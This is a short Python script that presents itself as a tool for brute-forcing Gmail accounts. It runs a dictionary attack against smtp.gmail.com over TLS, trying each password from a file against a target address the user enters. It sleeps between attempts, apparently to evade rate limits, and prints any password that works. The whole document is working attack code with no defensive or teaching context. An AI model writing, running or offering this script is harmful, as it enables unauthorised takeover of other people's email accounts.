



# Purpose: Brute force smtp.gmail.com using a dictionary attack over TLS.

import time
import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input("Enter the target's email address: ")
passwfile = raw_input("Enter the password file name: ")
passwfile = open(passwfile, "r")

i=0
for password in passwfile:	
	time.sleep(5)	
	i=i+1
	if i==10:
		i=0
		print "sleep"
		time.sleep(90)
			
	
	try:
		smtpserver.login(user, password)

		print "[+] Password Found: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[!] Password Incorrect: %s" % password
